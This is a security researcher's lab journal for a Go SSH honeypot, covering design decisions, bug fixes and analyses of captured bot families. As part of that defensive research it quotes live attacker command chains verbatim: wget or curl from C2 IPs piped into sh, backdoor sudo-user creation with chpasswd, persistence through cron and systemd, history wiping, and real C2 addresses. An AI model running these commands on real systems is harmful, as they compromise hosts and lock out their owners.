# NOTES.md -- ssh-honeypot lab journal

Decision reasons, findings, bugs. Tagged-bullet format.

## Phase 1 -- skeleton decisions

- did: root packages, no cmd/ -- kept it simple
- did: slog JSON logs -- structured for analysis
- did: x/crypto/ssh -- only real option for a Go SSH server
- did: flag stdlib -- enough, no cobra
- did: standard module path

## Phase 2 Iteration 1 -- walking skeleton

- did: walking skeleton first, minimal packages -- fast feedback
- did: Config Addr only; Logger as io.Writer; ephemeral ed25519 key; reject all auth first; basic auth-log fields; server.Options struct
- skip: tests, file logs, graceful shutdown
- note: learned closures for logging; SSH errors surface all attempts

## Phase 2 Iteration 2 -- session channels

- did: accept all auth; log before return; session channels only; goroutine per channel; parse request structs
- skip: no shell, no tests
- watch: must drain requests
- did: ssh.Unmarshal works for request payloads

## Phase 2 Iteration 3 -- raw shell input

- did: byte loop for raw input; manual echo CRLF; simple buffer; flat command map (temp); fixed fake system
- skip: no dynamic cmds, no args, no tests
- bug: CRLF handling
- note: slice logic finally clicked

## Phase 2 Iteration 4 -- command registry

- did: Cmd interface; registry map; args handled inside each cmd; grouped files; sudo fakes root; real exit codes
- skip: no cwd, no capture, no tests
- note: this is building the attacker UX

## Phase 3 Iteration 1 -- logging

- did: 3 log files; append mode; log-dir flag
- skip: no rotation, no correlation
- watch: cleanup on error; slog = writer

## Phase 3 Iteration 2 -- persistent host key

- did: persistent ed25519 key
- why: scanners fingerprint the host key; a key change on restart is a tell
- why(tradeoff): key theft is low risk for a honeypot
- skip: no rotation

## Phase summaries

- did(P1): honeypot interaction levels, SSH auth, crypto/rand, key strategy
- did(P2): channel risks, wire format, fingerprinting
- did(P3): terminal modes, fake-system consistency, attack-script flow

## Pre-deploy session -- multi-password auth counter

- did: reject first 3, accept on 4th (multi-password per connection)
- did: sync.Mutex + map[string]int keyed by c.SessionID() for per-connection counts
- did: Handle returns session ID string so the goroutine cleans the map after disconnect
- did: MaxAuthTries 6 explicit so the library doesn't cut clients before the 4th attempt
- did: go mod tidy -- x/crypto was // indirect, fixed to direct
- did: pubkey auth not logged, no PublicKeyCallback -- silent drop
- skip: PublicKeyCallback (bots rarely use pubkey, later); AuthLogCallback (catches all methods but less detail per attempt)
- bug: multiple ssh.Password() entries in client config do NOT retry -- SSH client marks the password method exhausted after the first server reject
- fix: RetryableAuthMethod + PasswordCallback with a cycling closure to test N attempts
- bug: net.Pipe() deadlocks SSH tests -- both sides write the version string before reading, synchronous pipe stalls
- fix: real TCP (net.Listen on :0)
- did: unit-test the callback directly with a fake ssh.ConnMetadata -- cleaner than a full handshake for the counter logic
- result: bots trying 1-2 passwords per connection now get rejected + reconnect; the "attempt" field in auth.log correlates same-IP sessions
- did(tests): hostkey LoadOrGenerate (create + reload same key); logger (files created, Close ok, writes land); session/cmd_test.go (24 commands + 8 edge cases); server (callback counter, session isolation, 1 integration)

## Post-deploy bug fix -- counter never reached threshold

- bug: deployed, 329 auth attempts in 4h, only 2 got a shell (both the human tester); every real bot rejected on every attempt
- cause: attempts map keyed by c.RemoteAddr().String() = IP:port; bots open a fresh TCP connection per guess, new ephemeral port each time, so the key changed every time and n was always 1 -- nobody reached threshold
- bug(second, found during fix): goroutine cleanup ran delete(attempts, host) after every close, wiping the counter even with IP-only keys
- fix: key by IP only (net.SplitHostPort strips the port); cleanup only on accept (if attempts[host] >= 10 { delete }); threshold 2 -> 10 (harvest more passwords first); MaxAuthTries 6 -> 20 to match
- did(tests): TestCallbackAccumulatesAcrossConnections (same IP, 10 ports, n goes 1..10); TestCallbackResetsOnlyAfterAccept (no wipe on reject); TestIntegrationThresholdAcrossConnections (real Serve(), 10 TCP connections, #10 accepted -- caught the cleanup bug live)
- result: verified on VPS -- attempts 1-9 rejected, 10 accepted, 11 rejected (reset)

## First findings + bait + scp receive (first ~6h, Helsinki VPS)

- result: 541 auth attempts from 10 IPs; almost all SSH-2.0-Go banners (Go mass scanners), credential stuffing with dumb passwords (123456, 1, 123)
- result(bot type 1, crypto-miner recon): uname -s -v -n -r -m, nproc, lspci | grep 3D, uname -m -- OS + CPU count + GPU check; lspci|grep 3D is the GPU gate; ran the same script 11x
- result(bot type 2, dropper): mkdir /lib/<random10> then scp -t -r /lib/<random10>/ x10 different dir names; scp -t is server-side SCP receive, trying to upload a payload; we returned exit 1 so all 10 failed
- did(bait): nproc -> 8; lspci -> fake PCI list with a Tesla T4 3D-controller line; uname -s -v -n -r -m multi-flag case; miner now sees an 8-core GPU box, should try harder
- did(scp receive, option A -- exit 0, capture the playbook): scp -t speaks the SCP wire protocol server-side -- sends \x00 ready byte, parses C/D/E headers, drains file data with io.LimitReader, acks each step, exits 0; bot thinks upload worked -> proceeds to chmod +x + execute -> visible in session.log
- did(shell path): scpCmd.Run returns exit 0 when -t present; can't do the wire protocol over the line-buffered shell but exit 0 keeps the bot moving
- why(rejected option B, permission denied): would stop the bot before its next step; point is to capture the full playbook
- did(tests): isSCPReceive (8 flag positions); shell path (-t exits 0, else non-zero "unreachable"); exec path (single file, recursive dir, empty stream); fakeChan implements ssh.Channel with in-memory buffers
- did(integration): verify/dropper_sim.go connects live, loops until accepted, speaks full SCP, checks ack bytes \x00, verifies exit 0; verified on VPS_IP:2222, accepted on attempt 6 (counter partially accumulated)
- todo(watch next): chmod +x + execute after scp (upload path worked); curl/wget with a real C2 URL (the money finding); crontab/systemctl (persistence)

## I-2 -- stateful virtual filesystem

- did: Session struct per connection -- cwd, fs map[string][]byte, dirs map[string]bool
- did: mkdir/touch/rm/cd/pwd mutate/read session state; ls checks session FS first then hardcoded / + home; cat checks session FS first (uploaded files visible after scp); scp writes received path into sess.fs so ls /tmp shows it; /bin/echo added to fakeFiles as ELF magic bytes (closes T2)
- why(rejected): global FS state -- per-session is cleaner, no cross-session leaks; persistent FS across reconnects not worth the complexity

## && operator + redirect stripping

- did: dispatchSegment holds pipe logic, dispatch loops on && segments; stop on first non-zero exit (bash && semantics); > /dev/null stripped before dispatch so echo-then-cat chains work; egrep aliased to grep
- why: Diicot runs lspci | egrep VGA && lspci | grep 3D -- egrep was "command not found", whole command failed, bot never escalated; ELF checkers use echo 1 > /dev/null && cat /bin/echo (same && + redirect issue)
- why(rejected): inlining && split inside dispatch without a helper -- harder to test

## I-4 -- real pipe execution

- did: dispatch splits on |, feeds each stage stdout into next stdin; Cmd interface gains stdin string + sess *Session
- did: grep filters stdin lines (joins multi-word patterns split by Fields); wc counts lines/words/bytes; head -c N slices first N bytes; awk {print $1}/{printf $1} extracts field 1, no-arg passes through
- result: full Diicot recon pipeline works E2E -- nvidia-smi -q | grep "Product Name" | awk | wc -l | head -c 1 -> 1
- why(rejected): semicolon chaining -- out of scope, pipes cover the capture data

## I-8 + I-10 -- analysis scripts

- did: analysis/sessions.py groups events by sid, renders per-session Markdown timeline
- did: analysis/timeline.py first/last-seen per password + command, flags chpasswd overlap (credential loop)

## I-3 -- missing commands

- did: nvidia-smi real Tesla T4 output for bare/-q/-L (closes T1); killall/chattr/disown/chpasswd as exit-0 noops (closes T4); awk/wc/head/grep registered as stubs (no pipes yet); fakeBinaries so which/whereis return real paths
- why(rejected): real awk/wc/head processing -- pointless without pipes (I-4)

## I-1 -- payload quarantine

- did: --quarantine-dir flag (empty = disabled, dir created at startup); filepath.Base on attacker filename (path-traversal kill); 50MB cap then drain rest to discard (protocol stays intact); <sha256>-<name>.bin naming (free dedup)
- why(rejected): hardcoded path next to log-dir (wanted operator control); saving to discard on any error (kept as fallback, not default)

## analysis tooling session -- report.py + analyze.sh

- did(report.py): rich terminal report w/ ANSI, --no-color for txt; hourly ASCII heatmap; kill-chain phase per command (RECON/STAGE/UPLOAD/EXEC/PERSIST/CLEANUP); bot fingerprinting (Diicot = lspci + nproc + scp -t to /lib/); one-sentence session narrative; sequential password detection (1->12->123->1234); credential-feedback-loop flag (IP keeps trying after first accept)
- why(rejected): merging into sessions.py -- different format, different audience
- did(analyze.sh): local-only wrapper, one arg (log dir), runs all 4 scripts, result-HHMM--DD-MM naming, result-*.txt gitignored
- result(2026-05-28): 71.227.179.172 -- 1545 unique passwords, 1382 attempts after first accept (feedback loop confirmed in the wild); 22:00 UTC spike 1238 attempts/hour (coordinated spray); SSH-2.0-Go dominates banners (scanning ecosystem almost all Go)

## quarantine audit + SCP bug + w.sh bot (2026-05-30)

- result: quarantine IS enabled + working but captured 0 real attacker payloads; systemctl just truncated the ExecStart line, --quarantine-dir is present
- result: one file captured -- scp_test_payload.sh.bin (27B, 2026-05-28 22:39), our own dropper_sim.go run; mode r--------, honeypot-owned (correct)
- result(SCP breakdown by sid msg types): d22ff677d5 (real attacker, 05-26 17:50, 11 attempts) = channel request + exec only, NO scp receive/file/data -- wire protocol never spoken; e30b8bd4ff/2d1b80adfb (dropper_sim, 05-27 00:49) = wire protocol spoken, no payload saved (quarantine off then); 84e0a852af (dropper_sim, 05-28 22:39) = wire spoken + quarantine on = the only real captured file
- result: the 4 sessions in report.py's alert = 1 real attacker + 3 our tests
- bug: interactive-shell SCP path is broken -- when the attacker typed scp -t -r /path/ at the shell, scpCmd returned exit 0 but never sent the \x00 ready byte; the attacker's scp client waited for \x00, got nothing, hung; upload never started; bot thought it worked (exit 0) but handshake was incomplete -- this is why 0 real payloads captured
- cause: exec channel path (dropper_sim) calls runSCPReceive (full wire protocol); shell path does not -- two different code paths
- fix(needed): when scp -t comes via the interactive shell, engage runSCPReceive instead of returning plain exit 0
- result(new family, w.sh/astats, appeared 2026-05-29 14:17 under threshold=1): most sophisticated persistence seen; botnet spray, different IP every ~30-45min
- result(w.sh kill chain): 1 find writable dir (tries /dev/shm,/tmp,/var/run,/mnt,/root,/ in order); 2 drop w.sh to /tmp + chmod +x; 3 cron adds /tmp/w.sh "astats" "netai" "kstats"; 4 systemd user service ~/.config/systemd/user/watcher-netai.service; 5 ps aux | grep astats (already-running check); 6 drop miner named astats to /dev/shm or /tmp
- note: two persistence mechanisms at once; process names (astats/netai/kstats) disguised as monitoring tools in ps aux; zero sessions before threshold=1 -- single-shot family
- result(Period 8, 22h in, 87.6h total): 143 attempts, 41 IPs, 27 single-shot (66%), 143 accepted, 234 commands; +3800% commands vs P7, +1688% accepted, +440% single-shot; kill-chain RECON=119 OTHER=75 STAGE=24 EXEC=12 PERSIST=4
- todo(bugs next session): interactive-shell SCP -> runSCPReceive from shell dispatch on scp -t; double-logging (every exec logs as both "channel request" + "exec", log 2x larger); crontab is a noop (a stateful crontab would reveal w.sh dedup logic)
- todo(experiments): fake wget/curl logging the URL (C2 dropper at 14.46.136.77/sh hits hourly); switch back to threshold=10 for 48h for a clean blog comparison

## full session analysis -- bot families (2026-05-29)

- result: 687 unique commands, 235 sessions, 72h total
- result(Diicot GPU miner, dominant ~180 sessions, 05-26/27): same recon every time -- uname -s -v -n -r -m; nproc; lspci | egrep VGA && lspci | grep 3D; uname -m
- result(Diicot advanced variant): nvidia-smi pipeline then kill chain -- crontab -r; chattr -iae ~/.ssh/authorized_keys; cd /var/tmp; rm -rf /dev/shm/.x ...; wipes crontab, chattr-locks authorized_keys (competitors can't add keys), kills other miners, deploys; our fake Tesla T4 triggered the deploy stage -- bait worked
- result(SCP dropper, 05-26 17:50, one session): 11 dirs in sequence for a writable path -- /lib/, hidden, /dev/, /dev/shm/, /var/volatile/, /tmp/, /sys/, /var/lib/, /root/, /etc/, /var/log/; each mkdir <random10> then scp -t -r <dir>/; exit 0 on all, nothing uploaded; same family as earlier, now confirmed systematic dir bruteforce
- result(password changer, 05-26 22:xx-05-27 01:xx): uname -a -> cat /etc/passwd -> passwd -> echo 'root:STRONGPW' | chpasswd; passwords i5n#_o$_6qFK!$s and $MWtB6=$e6mK#=E (both strong random); goal is lock out other attackers; tries interactive passwd first (fails in our shell), falls back to chpasswd; classic exclusive-access move
- result(C2 dropper, fileless, 05-29 new, threshold=1): uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh; auth_ok beacon (hex="auth_ok\n") then pipe-to-sh from 14.46.136.77; fileless, nothing on disk; via exec channel (invisible to old analysis); 4+ hits today, different IPs, same C2 -- botnet spray; most dangerous pattern so far
- result(VPS assessor, 05-29 09:48, one session): 35 commands -- package managers (apt/yum/pacman/zypper), shadow read, dd bs=1M count=10 disk benchmark, net interfaces, running services, connectivity; profiling for deployment; deployed nothing (pure recon)
- result(volume): 05-26 88 cmds (initial wave, mixed); 05-27 545 cmds (Diicot heavy); 05-28 10 cmds (genuinely quiet); 05-29 44 cmds so far (new families, C2 dropper)
- note: the 05-28 quiet period is real; the "command drought" was partly the exec blind spot, partly actual silence

## exec channel blind spot + live dropper (2026-05-29)

- bug: report.py + periods.py both undercount commands -- session.log has shell (interactive), exec (one-shot ssh host cmd), and channel request (logged again in logRequest() before dispatch, so every exec appears twice); both scripts only counted msg=="shell"
- cause: logRequest() logs the command as "channel request", then runExec() logs it again as "exec"
- result: this is why P8 showed "0 commands" and the report showed "10" -- missing 679 exec-channel commands; real count 05-29 = 44 unique commands, 92 log entries
- fix(needed): count msg=="exec" OR "shell", dedup by (sid, command) to avoid the channel-request double-count
- result(live dropper today, threshold=1): uname -a; echo -e "\x61...\x0A"; (wget ... || curl ...) | sh -s ssh -- hex "auth_ok\n" C2 beacon; downloads+pipes 14.46.136.77/sh into sh (no file on disk); -s ssh tells the script the entry vector; via exec channel; 4+ hits, different IPs, same payload/C2
- result(VPS assessment bot, sid e1877e76, 05-29 09:48): 35 commands -- pkg managers, shadow read, dd, net config, systemd services, ping 8.8.8.8; infrastructure scout picking mining candidates
- cause(bursty): P5-7 showed 0 commands because exec wasn't counted; activity was continuous, just invisible -- the drought was a broken-script artifact

## auth-threshold flag + analysis period tooling

- did: AuthThreshold int config flag, default 1 (accept immediately); logs auth_threshold at startup in server.log (period anchor for analysis); Serve() clamps to 1 if unset (avoids n>=0 always-true footgun); analysis tool splits periods by reading "listening" events in server.log
- why(threshold=1 now): VPS data shows most IPs try once then leave; threshold=10 harvested passwords but missed all post-auth commands from single-shot bots; keep the flag to flip back to 10 and compare spray vs shell data
- why(rejected): hardcoding 1 -- wanted the option to go back without a code change

## new families: SSHCHK (F8) + minimal OS scanner (F9) (2026-05-30, Rabat)

- result: 93.5h total, 3297 attempts, 180 IPs, 880 commands
- result(F8 SSHCHK liveness, 02:20 + 02:23 UTC, 2 sessions): echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; df -P / | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
- result(F8 components): BEGIN/END framing with a unique hex token per session (C2 extracts between markers, prevents replay, correlates output); uname -srm (OS+release+arch); echo $((7*191+3))=1340 arithmetic proof-of-work (a static replay or broken shell returns something else -- confirms a live interactive shell); df -P / | awk 'NR==2{print $1}' (root fs device)
- note: 2 sessions, different SSH-2.0-Go IPs, 3min apart; same tool, different botnet nodes; no follow-up (C2 decides externally); most careful liveness check in the dataset
- result(F9 minimal OS scanner, 06:03 + 07:39 UTC, 2 sessions): uname -s -m only; SSH-2.0-Go, different IPs, 1h36m apart; returns "Linux x86_64", disconnects immediately; if not Linux x86_64 the bot never sends a payload; lightest possible post-auth probe, maybe a first-stage probe or a cataloguing scanner

## SCP fix + quarantine uncertainty (2026-05-30)

- fix: interactive-shell SCP path now sends the \x00 ready byte -- runShell detects isSCPReceive before dispatch + hands the channel to runSCPReceive (full wire protocol); required adding quarantineDir param to runShell
- bug(before): scpCmd.Run() returned ("",0) without the wire protocol; the attacker's scp client waited for \x00, timed out; upload impossible by design
- watch(uncertain -- will quarantine capture real payloads now): if the bot is SCP-aware (expects \x00, sends file headers on the same connection) -> payload lands; if it's a dumb script (types commands, doesn't switch to SCP mode after \x00) -> sees the byte as terminal output, nothing uploaded
- result: exec path (dropper_sim) guaranteed to work (client explicitly in SCP mode); shell path depends on attacker implementation; know after next SCP dropper hit

## wget/curl URL logging (2026-05-30)

- context: experiment to capture C2 dropper URLs
- did: added log *slog.Logger to Session, set in Handle() after the sid is assigned so URL entries carry the session sid
- did: wget + curl call sess.log.Info("wget fetch"/"curl fetch", "url", url) before the fake error; guard sess != nil && sess.log != nil so test dispatch() calls don't panic
- result: on the C2 dropper (wget ... https://14.46.136.77/sh | sh -s ssh) session.log gets {"msg":"wget fetch","url":"https://14.46.136.77/sh","sid":"..."}
- todo: look up the URL on Shodan/VirusTotal to identify C2 infra

## bait for F8 (SSHCHK) + F9 (minimal scanner) (2026-05-30)

- did(F9 uname -s -m): was returning "Linux\n"; added "-s-m"/"-sm" cases to unameCmd; now "Linux x86_64\n"
- did(F8, 4 issues): uname -srm case -> "Linux 6.8.0-49-generic x86_64\n"
- did: implemented $((expr)) arithmetic expansion -- evalArith() recursive-descent parser in commands.go (+ - * / with precedence); expandVars runs expandArith before os.Expand; $((7*191+3)) -> 1340 (SSHCHK proof-of-work now correct, C2 thinks it has a real shell)
- did: awk 'NR==2{print $1}' -- was applying {print $1} to ALL lines; added nrRe regex for NR==N, skips other lines; df -P / | awk 'NR==2{print $1}' -> "/dev/vda1"
- did: df -P handling -- POSIX format (512-blocks header, root fs line only); awk NR==2 needs exactly 2 lines with the device on line 2
- bug(hidden, found + fixed): expandVars called os.Expand which mapped $1,$2 to "" (not in fakeEnv), silently destroying awk field refs before awk saw them
- fix: preserve $N for digit N -- return "$"+k instead of fakeEnv[k] for numeric keys

## family 10 -- ELF echo injector (2026-05-30 11:18 UTC)

- result: appeared 17min after a new binary deployed; single session eb342541b5
- result(kill chain): 1 uname -s / uname -m (arch); 2 wget then curl from two C2s (redundancy) -- 195.177.94.72:564/b/amd64, 45.88.91.135:35146/b/amd64; 3 when downloads fail (our fake wget/curl error), falls back to writing the binary directly as hex via 407 echo -e -n chunks (~6.5KB ELF)
- note: whole amd64 binary hardcoded as hex in the command sequence; designed for outbound-HTTP-blocked environments -- the bot carries its payload inside itself (in-band delivery); \x7f\x45\x4c\x46 = ELF magic (every Linux binary starts with these 4 bytes)
- result: URL logging confirmed working -- both C2 URLs in session.log
- note: 17min after deploy is how fast these bots scan the whole internet; fresh IP + new port doesn't matter, they find you almost instantly

## family 10 live session -- still writing (2026-05-30 ~12:45 Rabat)

- result: session eb342541b5 injecting ELF hex chunks for 27+ min; 14,760 unique echo commands, ~236KB binary written byte by byte; live as of 12:45 Rabat
- note: genuinely surprised it's still going -- patiently writing the binary over a slow connection, not giving up byte by byte :) idk why but this is making me smile
- note: no risk to VPS (fake shell, nothing executes, binary goes to in-memory session FS); wanted a nap but the bot is still going and i can't stop watching
- result(finished 12:56 Rabat, 38min): after 21,450 echo chunks -- chmod 777 /tmp/amd64; /tmp/amd64; rm -f amd64
- result: immediately tried to fetch kal64 from the same two C2s (195.177.94.72:564/b/kal64, 45.88.91.135:35146/b/kal64); both failed (fake wget); started injecting kal64 the same way, byte by byte
- result: VPS scout showed up 13:00 Rabat (session 38764bf24d), same 35-command sequence, different IP -- came right after amd64 executed; same botnet probably (one part injects the miner, another scouts)
- result: 13:05 Rabat -- eb342541b5 at 32,254 echo chunks (kal64 now), not giving up

## family 10 -- binaries captured, not yet analysed (2026-05-30)

- ioc(C2 URLs): 195.177.94.72:564/b/amd64 + /b/kal64; 45.88.91.135:35146/b/amd64
- ioc(source IP): 152.89.61.139 (Ukraine)
- result: bot dropped amd64 (~343KB injected via echo) + tried kal64; downloadable directly from the C2s (still live)
- todo: learn to analyse them properly -- echo-injected amd64 + fetched kal64, likely a dropper + miner; confirm by reading the code (RE learning experience on Linux malware)
- result: kal64 finished + executed; now injecting a third binary kswpad into /etc/; 37,421 echo chunks, last entry 13:26 Rabat, still going
- result: kswpad finished, executed (pkill kswpad first), deleted 13:27; fourth binary linux into /tmp, executed 13:36, deleted; 43,058 echo chunks total
- result(full session eb342541b5): 12:18-13:36 Rabat = 78min, 4 binaries in sequence amd64 -> kal64 -> kswpad -> linux; each written byte-by-byte via echo when download failed, executed, deleted, then next; longest single session in the dataset
- todo: have all 4 binaries, reconstructable from session logs; still don't know how to properly analyse them

## session 2026-05-31 morning -- notify pipeline

- did: notify.sh + cron (every 4h, aligned to 05:43 UTC) -- pulls VPS logs, sends HTML diff email via notify.py; stats.py output too large for Gmail raw, trimmed to summary + top sections
- result: F10 hit twice today; session c523e246ab55 started May 30 23:29 UTC (log rotated under it), ended 00:38 UTC -- real duration 1h09min (not 38min as today's log suggested); session eadedac033be started 09:37 Rabat, same 4-binary chain, same two C2s but /s/ path (not /b/), still running at close (1h18min+)
- result(F11 meow confirmed): two hits 02:09 + 02:12 Rabat, C2 34.11.111.237, backdoor users admin1+user1 password modzmodz, /tmp/mew differs between hits; not yet analysed
- watch: always check the .gz archive -- log rotation at midnight UTC split c523e246ab55 in half; real span 00:29-01:38 Rabat = 1h09min, found by pulling session.log.1.gz

## TODO: F11 meow dropper (2026-05-31)

- todo: downloads meow + meowarm64 from 34.11.111.237, creates backdoor sudo users admin1/user1 (modzmodz), changes current-user password, writes root credential to /tmp/mew; two hits, trailing password differs (root:webserver vs root:fuck123) -- same C2, two operators or a parameterized campaign; analyse the binary + the /tmp/mew harvesting logic

## logrotate incident + fix (2026-05-31 afternoon)

- bug: weekly logrotate at midnight UTC rotated session.log; honeypot kept writing the new file (copytruncate, same fd) but server.log got wiped; report showed 12h instead of full history
- fix(recovery): full history in session.log.1.gz (pre-midnight) + live session.log (post-midnight); local pull at 00:47 Rabat had the complete server.log w/ all restart history from May 26; merged into full-merged/, full 121h dataset intact
- fix(permanent): rewrote /etc/logrotate.d/ssh-honeypot -- daily, 60 rotates, dateext (session.log-2026-05-31.gz), delaycompress; verified --debug; next midnight produces dated archives
- watch: always pull *.gz alongside *.log -- the .gz has pre-rotation history

## F11 meow dropper -- observed, not yet analysed

- result(kill chain, 2 sessions 01:09 + 01:12 UTC May 31): cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://34.11.111.237/meow; chmod 777 meow; ./meow; wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64; echo $(whoami):modzmodz | chpasswd; useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1; useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd; echo -n 'root:webserver' > /tmp/mew (second hit: root:fuck123)
- result(known): drops x86 + ARM64 (multi-arch, no fingerprinting), 2 backdoor sudo users, changes current-user password, writes a credential to /tmp/mew; /tmp/mew differs between hits (parameterized per campaign/operator)
- todo(unknown): what meow/meowarm64 actually do (no binary analysis), what /tmp/mew is for (exfil? local?), who runs the campaign
- todo: download meow from 34.11.111.237 if live, strings + file + readelf, check C2 blocklists

## 2026-05-31 afternoon pull

- result: eadedac033be (F10 second session today) 08:37-10:58 Rabat, 1h21min, 43,314 log lines; same 4-binary sequence, same two C2 IPs, path /b/ -> /s/; routine at this point
- result: F11 meow hit twice again (01:09 + 01:12 Rabat), same C2; looking like a daily visitor
- result(full merged, server.log.1.gz + live): 124h, 3,526 attempts, 204 IPs, 738 accepted, 126,063 commands; Period 9 alone 125,168 commands (124,976 are F10 echo chunks); server.log empty again (no restart since May 30 12:01 Rabat), merged by pulling .gz alongside .log

## blog post -- best replay.py session per family

- cmd:
      python3 analysis/replay.py <merged-log-dir> --session <SID>
      # drop --no-color for the screenshot, colors make it readable
- result(picks):
      F1  credential stuffing  -- no shell cmds; use report.py top-passwords; IP 71.227.179.172 (1545 attempts, feedback loop in auth.log)
      F2  Diicot GPU miner     -- dc727dd9b39f  10 cmds, full recon+deploy, chattr line is the hook
      F3  SCP dropper          -- d22ff677d549  22 cmds, 11 mkdir+scp pairs, systematic dir bruteforce
      F4  password changer     -- 29e4813a04ad  4 cmds: uname -> cat /etc/passwd -> passwd -> chpasswd
      F5  C2 dropper fileless  -- a7a62f0046ee  auth_ok beacon + wget|sh, first hit 2026-05-29 07:56
      F6  w.sh / astats        -- 95bd06bfef71  w.sh drop + cron + systemd + astats miner, full persistence
      F7  VPS infrastructure   -- e1877e76a176  35 cmds: apt/yum/pacman/zypper + dd + ping 8.8.8.8
      F8  SSHCHK liveness      -- f63b5f809061  BEGIN/END token + $((7*191+3)) proof-of-work
      F9  minimal OS scanner   -- d52879b810e9  just uname -s -m, disconnects
      F10 ELF echo injector    -- eadedac033be  80min, 4 folded binary blocks, clean with --no-fold off
      F11 meow dropper         -- 72a973e0ba30  full kill chain in one exec: drop+exec+useradd+chpasswd+/tmp/mew

## 2026-06-01 pull

- result: full_merge_2026-06-01 -- 131h, 3644 attempts, 217 IPs, 856 sessions, 164,605 commands
- result(Period 9, threshold=1, since 05-30 12:01 Rabat): 337 attempts, 52 IPs, 337 accepted, 163,705 commands; 163,404 are echo chunks (F10 still dominant volume)
- result: new credential lab123 (16 hits in P9), not in previous pulls -- likely lab/IoT firmware defaults, worth tracking
- result: 22:00 UTC peak holds (1279 attempts); 11 credential feedback loops

## 2026-06-01 afternoon pull

- result: 150.2h, 3860 attempts, 233 IPs, 1072 sessions, 265,280 commands
- result(Period 9): 553 attempts, 76 IPs, 46 single-shot, 553 accepted, 264,365 commands
- result: F10 hit 4x (11eb9d2cafd4, 3f645bd7c5ba, f16b3d4aaa3c + one running 19:03 Rabat); paths alternating /b/ and /s/ on same C2s; routine
- result: F6 (w.sh/astats) surged -- 7 hits 13:43-15:58 Rabat, one every 5-15min (new frequency record)
- result: new credential support (36, climbing); lab123 at 26; both trending up
- result(new feedback loops): 103.146.202.84 (42 post-accept), 91.92.42.88 (10), 23.224.152.54 (10)
- result(new single-command probe, sid 79720193be3c, 138.99.79.29, password Suporte@123): hostname 2>/dev/null | head -1 | tr -d '\n' || cat /etc/hostname 2>/dev/null | head -1 | tr -d '\n' || echo 'N/A' -- more careful than F9 (fallback chain, strips newline for clean C2 output); not matching a known family, watching for repeat

## TODO: F12 wowo dropper candidate (2026-06-02)

- result: session d9ddf36a96 (01:53 UTC, 172.210.53.193) -- F7-style 35-command recon, then chmod 777 /usr/bin/curl; cd /tmp; curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86; chmod 777 runningaway.x86; ./runningaway.x86 vipies; rm -rf runningaway.x86; history -c
- note: "vipies" likely a campaign tag; self-deletes + wipes history; prior F7 never deployed -- unclear if F7 upgraded or a separate family with identical recon TTPs
- todo: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, strings + file, decide if new family

## TODO: F13 gJw27HGL two-stage dropper candidate (2026-06-02)

- result: two-bot pattern -- 176.61.50.14 SCP-uploads /tmp/gJw27HGL, 172.210.53.193 executes it; execute sessions 517b6d0aebb3 (06:06 UTC) + 30e7711a31a2 (10:02 UTC); upload session a3184ec762df (09:40 UTC, two attempts within 1s)
- note: execute at 06:06 predates upload at 09:40 -- the two bots run independently, executor assumes binary already present; quarantine may have captured gJw27HGL (couldn't verify, no sudo)
- todo: pull quarantine file, analyse gJw27HGL, confirm two-stage coordination or coincidence
- result(CONFIRMED 2026-06-03): gJw27HGL IS in quarantine -- dir mtime 2026-06-02 09:40:27 UTC (exact second sessions 736804a5e6 + a3184ec762df fired); dir 0700 honeypot-owned, can't read as VPS_USER; first real attacker payload captured by quarantine (previous was our dropper_sim.go)
- note: genuinely in tears, im happy :) really exciting -- first real payload captured; hope it's something interesting and not just a random miner; either way a milestone; need to update findings now
- todo: sudo pull gJw27HGL from quarantine

## F13 -- gJw27HGL analysis (2026-06-03)

- result: not a binary -- a 4.7KB bash script; quarantine filename tuLtUp8R (the SCP C-header name), not gJw27HGL (the path the executor sought); SHA256 confirmed matches quarantine file
- result: it's a Raspberry Pi SSH worm with IRC C2
- result(kill chain): 1 if not root, copy self to /opt/<random>, write /etc/rc.local for boot persistence, reboot; 2 kill competitors (minerd, ktx-*, kaiten, zmap, bins.sh, perl); 3 block competitor C2 (127.0.0.1 bins.deutschland-zahlung.eu in /etc/hosts); 4 inject RSA pubkey into /root/.ssh/authorized_keys (permanent backdoor); 5 change pi user password to a hardcoded SHA-512 hash; 6 IRC bot -- connects to Undernet (ix1/ix2.undernet.org + 4 others), joins #biret, commands arrive as base64 PRIVMSG with RSA signature (operator needs the private key, bot verifies before exec, can't be hijacked); 7 self-propagates -- zmap scans 100k IPs on :22, sshpass tries raspberry / raspberry993311, SCPs itself + executes
- result(two-bot mystery solved): both bots ARE this worm on two separate infected Pi machines; SCP phase (176.61.50.14, 09:40 UTC) + execute phase (172.210.53.193, 06:06 UTC) are two independent infected nodes, not coordinated; timing mismatch fits -- each infected machine runs the worm on whatever IPs zmap gives it
- note: classic Mirai-era Raspberry Pi worm, probably a Linux.MulDrop variant (2017-era); IRC C2 with RSA-signed commands is the sophisticated part of an otherwise simple shell script

## 2026-06-03 session

- result(stats, 190.3h): 4142 attempts, 267 IPs, 1354 sessions, 371,940 commands, 13 families; vs last pull (150.2h) +282 attempts, +34 IPs, +282 sessions, +106,660 commands
- bug(log pull): June 2 data missing from the .gz pull -- logrotate delaycompress left the rotated file uncompressed (session.log-2026-06-03, 52MB)
- fix: always pull uncompressed rotated files too, not just *.gz
- result(F12 wowo confirmed): session d9ddf36a96, 06-02 01:53 Rabat; runningaway.x86 from wowo.biz.id/wowiloveyou/, arg "vipies", self-deletes, history -c; same source IP as F13 (172.210.53.193); binary not analysed
- result(F13 confirmed + analysed): quarantine captured the 4.7KB bash script; quarantine filename tuLtUp8R (SCP C-header, not the -t path arg); two-bot mystery solved (two infected Pi nodes, same worm, independent)
- result(credentials trending): e3@HJgr=$4in-a- -> #4 (73, looks like breach data), support 65, lab123 46; new feedback-loop record 45.148.10.121 (69 post-accept)
- result(client clusters): AsyncSSH_2.1.0 (338, Python SSH lib, 27.79.x.x Vietnamese IPs); PuTTY_Release_0.83 (304, 3 IPs, wordlist sprays)
